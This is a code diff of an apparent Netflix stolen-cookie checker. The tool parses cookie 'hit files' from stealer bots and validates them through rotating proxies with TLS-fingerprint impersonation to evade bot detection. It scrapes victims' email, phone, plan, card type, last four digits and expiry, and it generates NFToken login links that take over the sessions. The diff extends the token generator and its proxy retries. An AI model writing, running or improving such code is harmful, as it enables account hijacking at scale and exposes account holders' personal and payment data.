@@ -45,14 +45,11 @@ def _clean_price(s: str) -> str:
     """Decode unicode currency symbols and clean up price strings."""
     if not s:
         return s
-    # Handle raw \\uNNNN sequences that were NOT yet decoded by JSON
-    # (i.e. the string literally contains backslash-u sequences)
     if '\\u' in s or '\\U' in s:
         try:
             s = s.encode('ascii').decode('unicode_escape')
         except Exception:
             pass
-    # Clean up non-breaking spaces
     s = s.replace('\u00a0', ' ').replace('\xa0', ' ').strip()
     return s
 
@@ -62,10 +59,6 @@ def _clean_price(s: str) -> str:
 # ---------------------------------------------------------------------------
 
 def _extract_reactcontext(html: str) -> dict:
-    """
-    Extract and parse the 'netflix.reactContext' JSON blob.
-    Fixes JavaScript \\xNN hex escape sequences before parsing.
-    """
     anchors = [
         "netflix.reactContext = {",
         "netflix.reactContext={",
@@ -160,8 +153,6 @@ BROWSER_HEADERS = {
     "Connection": "keep-alive",
 }
 
-# Login page markers — if any are found in the response body, cookie is invalid.
-# These are deliberately specific to avoid matching valid account pages.
 _LOGIN_PAGE_MARKERS = (
     'name="userLoginId"',
     '"signupContext":"login"',
@@ -173,7 +164,6 @@ _LOGIN_PAGE_MARKERS = (
     'class="login-content"',
 )
 
-# Rate limit / block markers in response body
 _RATE_LIMIT_MARKERS = (
     '"429"',
     'Too Many Requests',
@@ -186,7 +176,6 @@ _RATE_LIMIT_MARKERS = (
 
 
 def _is_login_page(url: str, html: str) -> bool:
-    """Return True if the response is a Netflix login page (invalid cookie)."""
     if "login" in url or "signin" in url.lower():
         return True
     if html and any(m in html[:4000] for m in _LOGIN_PAGE_MARKERS):
@@ -195,12 +184,12 @@ def _is_login_page(url: str, html: str) -> bool:
 
 
 def _is_rate_limited(status_code: int, html: str) -> bool:
-    """Return True if Netflix is rate-limiting or blocking this IP."""
     if status_code == 429:
         return True
     if status_code in (403, 503) and html and any(m in html[:2000] for m in _RATE_LIMIT_MARKERS):
         return True
     return False
+
 
 QUALITY_MAP = {
     "UHD": "4K+HDR",
@@ -219,8 +208,6 @@ PLAN_MAP = {
     "mobile": {"name": "Mobile", "quality": "480p", "streams": 1},
     "premium": {"name": "Premium", "quality": "4K+HDR", "streams": 4},
 }
-
-import json
 
 NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 NFTOKEN_PARAMS = {
@@ -248,8 +235,6 @@ NFTOKEN_HEADERS = {
     "x-netflix.os.version": "15.8.5",
     "x-netflix.device.model": "iPhone8,1",
 }
-
-
 
 
 # ---------------------------------------------------------------------------
@@ -361,7 +346,6 @@ def parse_json_cookies(text: str) -> dict:
 
 
 def parse_header_cookies(text: str) -> dict:
-    """Parse a single-line cookie string: name=value; name=value ..."""
     cookies = {}
     for part in text.split(";"):
         part = part.strip()
@@ -369,14 +353,11 @@ def parse_header_cookies(text: str) -> dict:
             name, _, value = part.partition("=")
             name = name.strip()
             value = value.strip()
-            # Only keep short, clean cookie names — reject multi-line garbage keys
             if name and len(name) < 80 and "\n" not in name:
                 cookies[name] = value
     return cookies
 
 
-# Matches lines like:  • Cookies     : nfvdid=...; NetflixId=...
-# Also handles:        Cookies: ...,  Cookie : ...,  • Cookie:  ...
 _HIT_COOKIE_LINE_RE = re.compile(
     r'^[•\-*]?\s*[Cc]ookies?\s*[:\|]+\s*(.+)',
 )
@@ -385,11 +366,6 @@ _SESSION_KEYS = {"NetflixId", "SecureNetflixId", "nfvdid", "gsid"}
 
 
 def parse_hit_file_cookies(text: str) -> dict:
-    """
-    Parse cookies from a structured hit-file block (rayen76/similar bots).
-    Finds the '• Cookies : nfvdid=...; NetflixId=...' line and parses only that.
-    The rest of the block (Name, Email, Plan, etc.) is safely ignored.
-    """
     for line in text.splitlines():
         m = _HIT_COOKIE_LINE_RE.match(line.strip())
         if not m:
@@ -398,7 +374,6 @@ def parse_hit_file_cookies(text: str) -> dict:
         if len(cookie_string) < 10:
             continue
         result = parse_header_cookies(cookie_string)
-        # Only return if at least one real Netflix session cookie was found
         if result and any(k in result for k in _SESSION_KEYS):
             return result
     return {}
@@ -419,16 +394,9 @@ def auto_parse_cookies(text: str) -> dict:
         parsed = parse_combo_line(line)
         if parsed and parsed.get("cookies"):
             return parsed["cookies"]
-    # Hit-file format (• Cookies : ...) — must come BEFORE parse_header_cookies
-    # to avoid the fallback turning the whole multi-line block into garbage keys
     result = parse_hit_file_cookies(text)
     if result:
         return result
-    # Newline-separated format: each line is a "key=value" cookie
-    # e.g. text copied from a hit card:
-    #   NetflixId=ct%3D...
-    #   SecureNetflixId=v%3D3%26...
-    #   nfvdid=BQFm...
     if "\n" in text:
         nl_cookies: dict[str, str] = {}
         for line in text.splitlines():
@@ -441,7 +409,6 @@ def auto_parse_cookies(text: str) -> dict:
                 nl_cookies[name] = value.strip()
         if nl_cookies and any(k in nl_cookies for k in _SESSION_KEYS):
             return nl_cookies
-    # Last resort: treat the whole text as a single-line cookie header
     return parse_header_cookies(text)
 
 
@@ -498,45 +465,152 @@ def extract_file_metadata(text: str) -> dict:
 
 
 # ---------------------------------------------------------------------------
-# NFToken generator
+# NFToken generator (Actualizado para reportar el motivo exacto en el ZIP)
 # ---------------------------------------------------------------------------
 
 def generate_nftoken(cookies: dict) -> dict:
-    netflix_id = cookies.get("NetflixId") or cookies.get("netflixId")
+    netflix_id = (
+        cookies.get("NetflixId")
+        or cookies.get("netflixId")
+        or cookies.get("netflix_id")
+    )
     if not netflix_id:
-        return {"success": False, "error": "NetflixId cookie not found"}
-    # NFToken API is Netflix's iOS endpoint — always call DIRECT (no proxy).
-    # Free/datacenter proxies return HTTP 500 from this endpoint; paid proxies
-    # happen to work but a direct call is faster and more reliable for all cases.
-    try:
-        resp = requests.get(
-            NFTOKEN_API_URL,
-            params=NFTOKEN_PARAMS,
-            headers={**NFTOKEN_HEADERS, "Cookie": f"NetflixId={netflix_id}"},
-            timeout=10,
-        )
-        print("STATUS:", resp.status_code)
-        print("BODY:", resp.text)
-        if resp.status_code != 200:
-            return {"success": False, "error": f"API returned HTTP {resp.status_code}"}
-        data = resp.json()
-        token_data = data.get("value", {}).get("account", {}).get("token", {}).get("default", {})
-        token = token_data.get("token")
-        expires = token_data.get("expires")
-        if not token:
-            return {"success": False, "error": "Token not found in API response"}
-        return {
-            "success": True,
-            "pc_url": f"https://netflix.com/?nftoken={token}",
-            "mobile_url": f"https://netflix.com/unsupported?nftoken={token}",
-            "tv_url": f"https://netflix.com/tv9?nftoken={token}",
-            "expires": str(expires) if expires else None,
-            "error": None,
-        }
-    except requests.exceptions.Timeout:
-        return {"success": False, "error": "NFToken request timed out"}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
+        return {"success": False, "error": "Cookie NetflixId no encontrada"}
+
+    # Construir cabecera enviando ambas cookies para autorizar la emisión de token
+    cookie_parts = [f"NetflixId={netflix_id}"]
+    sec_id = (
+        cookies.get("SecureNetflixId")
+        or cookies.get("secureNetflixId")
+        or cookies.get("secure_netflix_id")
+    )
+    if sec_id:
+        cookie_parts.append(f"SecureNetflixId={sec_id}")
+    nfvd = cookies.get("nfvdid") or cookies.get("nfvdId")
+    if nfvd:
+        cookie_parts.append(f"nfvdid={nfvd}")
+    cookie_header = "; ".join(cookie_parts)
+
+    headers = {**NFTOKEN_HEADERS, "Cookie": cookie_header}
+
+    # Intentos: primero directo; si falla con 502/403/timeout y hay proxy disponible, reintenta
+    attempts = [None]
+    if _PROXY_ENABLED and _proxy_manager and _proxy_manager.enabled:
+        p = _proxy_manager.get_proxies_dict()
+        if p:
+            attempts.append(p)
+
+    last_error_msg = "Error desconocido"
+
+    for proxy_dict in attempts:
+        try:
+            resp = requests.get(
+                NFTOKEN_API_URL,
+                params=NFTOKEN_PARAMS,
+                headers=headers,
+                proxies=proxy_dict,
+                timeout=9,
+            )
+
+            if resp.status_code != 200:
+                err_text = ""
+                try:
+                    err_json = resp.json()
+                    err_text = err_json.get("message") or err_json.get("error") or ""
+                except Exception:
+                    if resp.text:
+                        err_text = resp.text.replace("\n", " ")[:60].strip()
+                last_error_msg = f"HTTP {resp.status_code} ({err_text})" if err_text else f"HTTP {resp.status_code}"
+                if resp.status_code in (500, 502, 503, 403) and proxy_dict is None and len(attempts) > 1:
+                    continue
+                return {"success": False, "error": last_error_msg}
+
+            try:
+                data = resp.json()
+            except Exception:
+                raw_snippet = resp.text.replace("\n", " ")[:70] if resp.text else "Respuesta vacía"
+                return {"success": False, "error": f"Respuesta no JSON: {raw_snippet}"}
+
+            # ── 1. Búsqueda exhaustiva del token ──────────────────────────────
+            token = None
+            expires = None
+
+            def_val = data.get("value", {}).get("account", {}).get("token", {}).get("default")
+            if isinstance(def_val, dict):
+                token = def_val.get("token") or def_val.get("value")
+                expires = def_val.get("expires")
+            elif isinstance(def_val, str) and len(def_val) > 10:
+                token = def_val
+
+            if not token:
+                jg_val = data.get("jsonGraph", {}).get("account", {}).get("token", {}).get("default")
+                if isinstance(jg_val, dict):
+                    token = jg_val.get("value") or jg_val.get("token")
+                    expires = jg_val.get("expires")
+                elif isinstance(jg_val, str) and len(jg_val) > 10:
+                    token = jg_val
+
+            if not token:
+                acc_val = data.get("account", {}).get("token", {}).get("default")
+                if isinstance(acc_val, dict):
+                    token = acc_val.get("token") or acc_val.get("value")
+                    expires = acc_val.get("expires")
+                elif isinstance(acc_val, str) and len(acc_val) > 10:
+                    token = acc_val
+
+            if token and isinstance(token, str):
+                return {
+                    "success": True,
+                    "pc_url": f"https://netflix.com/?nftoken={token}",
+                    "mobile_url": f"https://netflix.com/unsupported?nftoken={token}",
+                    "tv_url": f"https://netflix.com/tv9?nftoken={token}",
+                    "expires": str(expires) if expires else None,
+                    "error": None,
+                }
+
+            # ── 2. Extracción del motivo real para mostrarlo en el archivo del ZIP ──
+            def _find_falcor_error(obj, depth=0):
+                if depth > 7:
+                    return None
+                if isinstance(obj, dict):
+                    if obj.get("$type") == "error":
+                        val = obj.get("value")
+                        if isinstance(val, dict):
+                            return val.get("message") or val.get("errorType") or str(val)
+                        return str(val) if val else "Error de autenticación Falcor"
+                    for v in obj.values():
+                        res = _find_falcor_error(v, depth + 1)
+                        if res:
+                            return res
+                elif isinstance(obj, list):
+                    for item in obj:
+                        res = _find_falcor_error(item, depth + 1)
+                        if res:
+                            return res
+                return None
+
+            falcor_err = _find_falcor_error(data)
+            if falcor_err:
+                return {"success": False, "error": f"Netflix rechazó token: {falcor_err}"}
+
+            if "message" in data:
+                return {"success": False, "error": f"Mensaje Netflix: {data['message']}"}
+
+            if "error" in data:
+                return {"success": False, "error": f"Error Netflix: {data['error']}"}
+
+            if def_val is None:
+                return {"success": False, "error": "Token nulo (sesión no válida para emisión o bloqueo de hogar)"}
+
+            snippet = json.dumps(data, ensure_ascii=False)[:80]
+            return {"success": False, "error": f"Sin token. Respuesta API: {snippet}"}
+
+        except requests.exceptions.Timeout:
+            last_error_msg = "Tiempo de espera agotado (timeout API)"
+        except Exception as exc:
+            last_error_msg = f"Error en petición: {str(exc)[:60]}"
+
+    return {"success": False, "error": last_error_msg}
 
 
 # ---------------------------------------------------------------------------
@@ -544,7 +618,6 @@ def generate_nftoken(cookies: dict) -> dict:
 # ---------------------------------------------------------------------------
 
 def _brace_extract(html: str, start_pos: int) -> dict | list | None:
-    """Parse a JSON object/array starting at start_pos in html."""
     raw = _decode_js_hex(html[start_pos:start_pos + 100000])
     opening = raw[0] if raw else ''
     closing = '}' if opening == '{' else ']'
@@ -572,7 +645,6 @@ def _brace_extract(html: str, start_pos: int) -> dict | list | None:
 
 
 def _extract_userinfo(html: str) -> dict:
-    """Extract models.userInfo.data from inline reactContext JS."""
     m = re.search(r'"userInfo"\s*:\s*\{[^{]*"data"\s*:\s*(\{)', html)
     if not m:
         return {}
@@ -581,20 +653,13 @@ def _extract_userinfo(html: str) -> dict:
 
 
 def _falcon_val(field: dict):
-    """Unwrap a Falcon-typed field: {"fieldType":"...", "value": X} → X"""
     if isinstance(field, dict):
         return field.get("value")
     return field
 
 
 def _extract_member_plan(html: str) -> dict:
-    """
-    Extract plan fields from the MemberPlan fieldGroup.
-    Returns: plan_name, quality, max_streams, has_ads, plan_id,
-             next_billing, price, is_on_hold, num_extra_members, show_payment
-    """
     result = {}
-    # Find currentPlan MemberPlan block
     m = re.search(
         r'"currentPlan"\s*:\s*\{[^{]*"fieldGroup"\s*:\s*"MemberPlan"\s*,\s*"fields"\s*:\s*(\{)',
         html
@@ -647,12 +712,7 @@ def _extract_member_plan(html: str) -> dict:
 
 
 def _extract_billing_date_from_html(html: str) -> str:
-    """
-    Find nextBillingDate as a Falcon-typed field string value.
-    e.g. "nextBillingDate":{"fieldType":"String","value":"21 April 2026"}
-    """
     html_decoded = _decode_js_hex(html)
-    # Match field with any fieldType (String, Numeric, etc.) before value
     patterns = [
         r'"nextBillingDate"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
         r'"nextBillingDate"\s*:\s*\{\s*"value"\s*:\s*"([^"]+)"',
@@ -672,7 +732,6 @@ def _extract_billing_date_from_html(html: str) -> str:
 
 
 def _extract_price_from_html(html: str) -> str:
-    """Find plan price as a Falcon-typed field."""
     html_decoded = _decode_js_hex(html)
     patterns = [
         r'"formattedPlanPrice"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
@@ -691,14 +750,9 @@ def _extract_price_from_html(html: str) -> str:
 
 
 def _extract_payment_info(html: str) -> dict:
-    """
-    Extract payment method details from paymentMethods field.
-    Returns: payment (str), card_type, card_last4, card_expiry, is_third_party, partner_name
-    """
     result = {}
     html_decoded = _decode_js_hex(html)
 
-    # Find the paymentMethods array
     m = re.search(r'"paymentMethods"\s*:\s*\{"fieldType"\s*:\s*"Custom"\s*,\s*"value"\s*:\s*(\[)', html_decoded)
     if not m:
         m = re.search(r'"paymentMethods"\s*:\s*\{[^[]*"value"\s*:\s*(\[)', html_decoded)
@@ -728,7 +782,6 @@ def _extract_payment_info(html: str) -> dict:
         exp_mo = fv("cardExpirationMonth")
         exp_yr = fv("cardExpirationYear")
         is_exp = fv("isExpired")
-        # Alternative payment types: UPI, wallet, netbanking etc.
         alt_method = fv("paymentMethod")
         display_text = fv("displayText")
 
@@ -763,10 +816,8 @@ def _extract_payment_info(html: str) -> dict:
                 else:
                     parts.append(f"(exp {exp_str})")
         elif alt_method:
-            # UPI, Wallet, Netbanking, CC (credit/debit with display text), etc.
             method_str = str(alt_method).upper()
             disp = str(display_text).strip() if display_text else ""
-            # If method is CC/DC and display looks like last-4 digits
             if method_str in ("CC", "DC", "DEBIT", "CREDIT") and re.match(r'^\d{4}$', disp):
                 result["card_type"] = method_str
                 result["card_last4"] = disp
@@ -786,24 +837,16 @@ def _extract_payment_info(html: str) -> dict:
 
 
 def _extract_profiles_list(html: str) -> tuple[list[str], int]:
-    """
-    Extract profile names and total profile count from the page.
-    Returns (names_list, total_count).
-    total_count comes from the profiles __ref array (accurate even when
-    only the active profile's name is visible on the membership page).
-    """
     html_decoded = _decode_js_hex(html)
     names = []
     seen = set()
 
-    # Extract any visible profile names
     for m in re.finditer(r'"profileName"\s*:\s*"([^"]{1,60})"', html_decoded):
         name = m.group(1).strip()
         if name and name not in seen:
             seen.add(name)
             names.append(name)
 
-    # Count from the profiles __ref array (most reliable count)
     total_count = len(names)
     m = re.search(r'"profiles"\s*:\s*(\[)', html_decoded)
     if m:
@@ -815,21 +858,11 @@ def _extract_profiles_list(html: str) -> tuple[list[str], int]:
 
 
 def _deep_search_ctx(obj, depth: int = 0) -> list[tuple[str, str]]:
-    """
-    Recursively walk a parsed Netflix reactContext JSON object and collect
-    payment / suspension signals.
-
-    Returns list of (signal_type, human_label) tuples.
-    100% language-agnostic: only inspects JSON keys and enum values,
-    never page-visible text.  Netflix always keeps these in English
-    regardless of what language the page is rendered in.
-    """
     if depth > 12:
         return []
 
     hits: list[tuple[str, str]] = []
 
-    # Enum values on status/type/state/alert/mode keys that mean "problem"
     BAD_ENUM_VALUES = {
         "SUSPENDED", "TERMINATED", "BLOCKED", "DEACTIVATED", "CLOSED",
         "PAYMENT_DUE", "PAYMENT_HOLD", "ON_HOLD", "PAYMENT_DECLINED",
@@ -838,14 +871,12 @@ def _deep_search_ctx(obj, depth: int = 0) -> list[tuple[str, str]]:
         "REACTIVATE",
     }
 
-    # CTA action strings that ONLY appear in payment-problem flows
     PAYMENT_ACTIONS = {
         "UPDATE_PAYMENT_METHOD", "UPDATE_PAYMENT_INFO", "TRY_PAYMENT_AGAIN",
         "RETRY_PAYMENT", "REACTIVATE_ACCOUNT", "FIX_PAYMENT",
         "UPDATE_PAYMENT", "PAYMENT_UPDATE", "MANAGE_PAYMENT_METHOD",
     }
 
-    # These keys being present with any truthy value = account problem
     ALERT_PRESENCE_KEYS = {
         "gracePeriodEndDate", "gracePeriodEnd", "gracePeriodMessage",
         "onHoldMessageText", "onHoldMessage",
@@ -855,7 +886,6 @@ def _deep_search_ctx(obj, depth: int = 0) -> list[tuple[str, str]]:
         "paymentUpdateMessage",
     }
 
-    # Regex: boolean-true keys that indicate a problem
     _BAD_BOOL_RE = re.compile(
         r'^(is|has|show)?(Suspended|Terminated|Locked|Blocked|'
         r'PaymentDue|PaymentDeclined|BillingProblem|PaymentFailed|'
@@ -866,26 +896,16 @@ def _deep_search_ctx(obj, depth: int = 0) -> list[tuple[str, str]]:
 
     if isinstance(obj, dict):
         for key, val in obj.items():
-
-            # ── Special case: isInGoodStanding false = bad ─────────────
             if key == "isInGoodStanding" and val is False:
                 hits.append(("not_good_standing", "Account not in good standing"))
-
-            # ── isOnHold true from MemberPlan ──────────────────────────
             elif key == "isOnHold" and val is True:
                 hits.append(("on_hold_flag", "Account on hold"))
-
-            # ── Alert/message key presence ─────────────────────────────
             elif key in ALERT_PRESENCE_KEYS:
                 v = val.get("value", val) if isinstance(val, dict) else val
                 if v and str(v) not in ("", "null", "false", "0"):
                     hits.append(("alert_key", f"Alert: {key}"))
-
-            # ── Boolean-true flags ─────────────────────────────────────
             elif val is True and _BAD_BOOL_RE.match(key):
                 hits.append(("bool_flag", f"Flag: {key}"))
-
-            # ── Bad enum values on status/type/state/alert keys ────────
             elif isinstance(val, str):
                 vu = val.upper()
                 kl = key.lower()
@@ -893,11 +913,9 @@ def _deep_search_ctx(obj, depth: int = 0) -> list[tuple[str, str]]:
                     x in kl for x in ("status", "type", "state", "alert", "mode", "reason")
                 ):
                     hits.append(("bad_enum", f"Status: {val}"))
-                # Payment action strings
                 elif vu in PAYMENT_ACTIONS:
                     hits.append(("payment_action", "Payment action required"))
 
-            # ── Recurse ────────────────────────────────────────────────
             if isinstance(val, (dict, list)):
                 hits.extend(_deep_search_ctx(val, depth + 1))
 
@@ -910,17 +928,6 @@ def _deep_search_ctx(obj, depth: int = 0) -> list[tuple[str, str]]:
 
 
 def _detect_account_issues(html: str) -> list[str]:
-    """
-    Detect account warnings / restrictions.
-
-    PRIMARY method: parse netflix.reactContext JSON with _extract_reactcontext,
-    then recursively walk the full object with _deep_search_ctx.
-    This is 100% language-agnostic — JSON keys / enum values are always
-    English regardless of what language the UI is rendered in.
-
-    FALLBACK: direct regex on the raw decoded HTML for fields that might
-    sit outside the reactContext block.
-    """
     seen: set[str] = set()
     issues: list[str] = []
 
@@ -929,16 +936,13 @@ def _detect_account_issues(html: str) -> list[str]:
             seen.add(label)
             issues.append(label)
 
-    # ── Primary: deep recursive walk of parsed reactContext JSON ─────────────
     ctx = _extract_reactcontext(html)
     if ctx:
         for _, label in _deep_search_ctx(ctx):
             _add(label)
 
-    # ── Fallback: fast regex on raw HTML (catches inline scripts outside ctx) ─
     html_decoded = _decode_js_hex(html)
 
-    # membershipStatus enum
     ms_m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html_decoded)
     if ms_m:
         ms = ms_m.group(1).upper()
@@ -946,11 +950,9 @@ def _detect_account_issues(html: str) -> list[str]:
                   "PAYMENT_DUE", "PAYMENT_HOLD", "ON_HOLD"):
             _add(f"Account status: {ms}")
 
-    # isInGoodStanding: false
     if re.search(r'"isInGoodStanding"\s*:\s*false', html_decoded, re.IGNORECASE):
         _add("Account not in good standing")
 
-    # Boolean flags
     for flag, label in {
         "isSuspended":        "Account suspended",
         "isTerminated":       "Account terminated",
@@ -967,7 +969,6 @@ def _detect_account_issues(html: str) -> list[str]:
 
 
 def _extract_phone(html: str) -> str:
-    """Extract phone number from profile data."""
     html_decoded = _decode_js_hex(html)
     for m in re.finditer(r'"phoneNumber"\s*:\s*"([^"]{5,25})"', html_decoded):
         ph = m.group(1).strip()
@@ -977,7 +978,6 @@ def _extract_phone(html: str) -> str:
 
 
 def _extract_email_verified(html: str) -> bool | None:
-    """Extract email verification status."""
     html_decoded = _decode_js_hex(html)
     m = re.search(r'"isEmailVerified"\s*:\s*(true|false)', html_decoded, re.IGNORECASE)
     if m:
@@ -993,12 +993,6 @@ _tl_session = _threading.local()
 
 
 def _get_pooled_session() -> tuple:
-    """
-    Return a thread-local reusable session (curl_cffi or requests).
-    Reusing sessions avoids repeated TLS handshake overhead — major speed win
-    when checking many cookies in parallel worker threads.
-    Returns (session, using_curl).
-    """
     if not getattr(_tl_session, "session", None):
         if _CURL_AVAILABLE:
             s = _curl_requests.Session(impersonate="chrome124")
@@ -1024,24 +1018,10 @@ def _get_pooled_session() -> tuple:
 
 
 def _make_session(bulk_mode: bool):
-    """
-    Return a pooled thread-local session.
-    Sessions are reused across calls in the same thread to avoid repeated
-    TLS handshake overhead.
-    """
     return _get_pooled_session()
 
 
 def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool = False) -> dict:
-    """
-    Validate a Netflix cookie and return full account info.
-    bulk_mode=True  → tighter timeout (10s), no NFToken (faster for bulk).
-    generate_token  → set False in bulk mode; token generated on demand via button.
-
-    Uses curl_cffi with Chrome124 TLS fingerprint impersonation to avoid
-    Netflix bot-detection that causes valid cookies to appear invalid.
-    """
-    import concurrent.futures as _cf
     cookie_text = cookie_text.strip()
 
     combo = parse_combo_line(cookie_text)
@@ -1069,37 +1049,21 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
             "message": f"No Netflix session cookies found. Got: {', '.join(list(cookies.keys())[:8])}",
         }
 
-    # Proxy timeout is very short so dead/slow proxies fail fast.
-    # Direct timeout is kept reasonable for reliability.
-    _proxy_timeout  = 2 if bulk_mode else 3   # seconds per proxy attempt
-    _direct_timeout = 5 if bulk_mode else 7   # seconds for direct attempt
-    _timeout = _direct_timeout                # used by NFToken and legacy paths
+    _proxy_timeout  = 2 if bulk_mode else 3
+    _direct_timeout = 5 if bulk_mode else 7
+    _timeout = _direct_timeout
     session, using_curl = _make_session(bulk_mode)
 
-    # ── Fetch membership page (+ optional parallel NFToken) ───────────────────
     nft_result: dict = {"success": False, "error": "skipped"}
 
     def _fetch_account():
-        """
-        Fetch /account/membership using a parallel proxy race.
-
-        When proxies are enabled: RACE_N proxies are tried simultaneously.
-        The first one that returns a valid response wins; the others are
-        discarded (they finish quickly due to the short timeout).
-        Dead/rate-limited proxies are marked and removed as they fail.
-
-        Direct mode: single attempt (bulk) or two sequential (single).
-        """
         _proxy_active = _PROXY_ENABLED and _proxy_manager and _proxy_manager.enabled
-        RACE_N = 6  # race 6 proxies at once — more chances of a fast one
+        RACE_N = 6
 
         def _purl(pd):
             return (pd.get("https") or pd.get("http") or "") if pd else ""
 
         def _one_attempt(proxy_dict, url):
-            """Single HTTP request. Returns ("OK"|"INVALID"|"LOGIN"|"FAIL", html).
-            Uses _proxy_timeout for proxy requests, _direct_timeout for direct.
-            """
             t = _proxy_timeout if proxy_dict else _direct_timeout
             try:
                 r = session.get(
@@ -1131,12 +1095,6 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
                 return "FAIL", ""
 
         def _race(url):
-            """
-            Race RACE_N proxies simultaneously; return first OK/INVALID result.
-            Falls back to direct if all proxies fail.
-            Race timeout = _proxy_timeout + 0.5s so we don't wait the full
-            direct timeout before falling through to the direct fallback.
-            """
             proxies = [_proxy_manager.get_proxies_dict() for _ in range(RACE_N)]
             proxies = [p for p in proxies if p]
             if not proxies:
@@ -1162,11 +1120,9 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
                             last_login_html = html
                             if login_hits >= len(proxies):
                                 return "INVALID", last_login_html
-                        # FAIL → keep waiting for other futures
                 except _cf.TimeoutError:
-                    pass  # all proxies timed out → fall through to direct
+                    pass
 
-            # All proxies failed/timed out → one direct attempt as last resort
             return _one_attempt(None, url)
 
         if _proxy_active:
@@ -1175,15 +1131,12 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
                 return "OK", html
             if status == "INVALID":
                 return "INVALID", html
-            # Soft-fail on membership page → try browse as backup (single mode only)
             if not bulk_mode:
                 status, html = _race("https://www.netflix.com/browse")
                 if status in ("OK", "INVALID"):
                     return status, html
             return "ERROR", ""
-
         else:
-            # Direct mode — no proxies
             url = "https://www.netflix.com/account/membership"
             status, html = _one_attempt(None, url)
             if status in ("OK", "INVALID"):
@@ -1199,11 +1152,6 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
 
     try:
         if generate_token:
-            # Single check: start account + NFToken fetches in parallel.
-            # Wait for the account check (critical path), then give the NFToken
-            # request a 1.5s grace window after that. If it misses the window
-            # the result is returned immediately; the user gets a "Get Login
-            # Link" button that generates the token on demand.
             pool = _cf.ThreadPoolExecutor(max_workers=2)
             f_account = pool.submit(_fetch_account)
             f_nft     = pool.submit(_fetch_nftoken)
@@ -1215,7 +1163,6 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
             finally:
                 pool.shutdown(wait=False)
         else:
-            # Bulk check: account only — NFToken generated on demand via button
             acct_status, acct_text = _fetch_account()
 
         if acct_status == "INVALID":
@@ -1224,21 +1171,18 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
             return {"status": "error", "message": "Could not reach Netflix account page."}
 
         account_html = acct_text
-        browse_html  = ""   # no longer fetched separately — all data from membership page
+        browse_html  = ""
 
         result: dict = {"status": "hit"}
 
-        # Cookie tokens
         result["netflix_id"]        = cookies.get("NetflixId", "")
         result["secure_netflix_id"] = cookies.get("SecureNetflixId", "")
         result["nfvdid"]            = cookies.get("nfvdid", "")
         result["phone"]             = file_meta.get("phone") or ""
         result["password"]          = file_meta.get("password") or ""
 
-        # ── userInfo ──────────────────────────────────────────────────────────
         userinfo = _extract_userinfo(account_html) or _extract_userinfo(browse_html)
 
-        # ── Membership status (highest priority) ──────────────────────────────
         ms_status = ""
         if userinfo:
             ms_status = (userinfo.get("membershipStatus") or "").upper()
@@ -1247,8 +1191,6 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
             result["status"] = "free"
         elif ms_status in ("ON_HOLD", "PAYMENT_HOLD", "PAYMENT_DUE", "SUSPENDED"):
             result["status"] = "on_hold"
-            # Pre-populate issues immediately — _detect_account_issues may miss these
-            # when reactContext is thin or the HTML is a redirect page
             _ms_issue_map = {
                 "SUSPENDED":    "Account suspended — access restricted",
                 "PAYMENT_DUE":  "Payment due — account on hold",
@@ -1260,19 +1202,15 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
         result["membership_status"] = ms_status or "Unknown"
         result["is_in_free_trial"]  = userinfo.get("isInFreeTrial", False) if userinfo else False
 
-        # ── Account issues / warnings ─────────────────────────────────────────
         issues = _detect_account_issues(account_html)
-        # Merge the pre-issue (from membershipStatus) if _detect_account_issues
-        # didn't already find it (happens when reactContext is thin/redirect page)
         try:
-            _pre = _pre_issue  # type: ignore[name-defined]  # set above if on_hold ms
+            _pre = _pre_issue
             if _pre and not any(_pre.lower().split()[0] in i.lower() for i in issues):
                 issues = [_pre] + issues
         except NameError:
             pass
         result["account_issues"] = issues
 
-        # ── Email ─────────────────────────────────────────────────────────────
         email = None
         if userinfo:
             raw_email = userinfo.get("emailAddress") or userinfo.get("email")
@@ -1292,10 +1230,8 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
                         break
         result["email"] = email or file_meta.get("email") or "Hidden"
 
-        # ── Email verified ────────────────────────────────────────────────────
         result["email_verified"] = _extract_email_verified(account_html)
 
-        # ── Display name ──────────────────────────────────────────────────────
         name = file_meta.get("name") or ""
         if not name and userinfo:
             raw_name = userinfo.get("name") or userinfo.get("firstName") or userinfo.get("displayName")
@@ -1305,11 +1241,9 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
                     name = cand
         result["name"] = name or ""
 
-        # ── Phone ─────────────────────────────────────────────────────────────
         if not result["phone"]:
             result["phone"] = _extract_phone(account_html) or _extract_phone(browse_html) or ""
 
-        # ── Plan / quality / streams ──────────────────────────────────────────
         plan_info = _extract_member_plan(account_html) or _extract_member_plan(browse_html)
 
         plan_name  = plan_info.get("plan_name")  or file_meta.get("plan_name") or ""
@@ -1338,16 +1272,12 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
         result["is_on_hold"]       = plan_info.get("is_on_hold", False)
         result["num_extra_members"]= plan_info.get("num_extra_members", 0)
 
-        # ── Backfill plan-level on-hold flag into issues + status ─────────────
-        # is_on_hold comes from MemberPlan.isOnHold, which is reliable even when
-        # membershipStatus is still "CURRENT_MEMBER" (grace-period accounts).
         if result["is_on_hold"] and result["status"] == "hit":
             result["status"] = "on_hold"
             existing = result.get("account_issues") or []
             if not any("on hold" in i.lower() for i in existing):
                 result["account_issues"] = list(existing) + ["Account on hold (payment failed)"]
 
-        # ── Country ───────────────────────────────────────────────────────────
         country = None
         if userinfo:
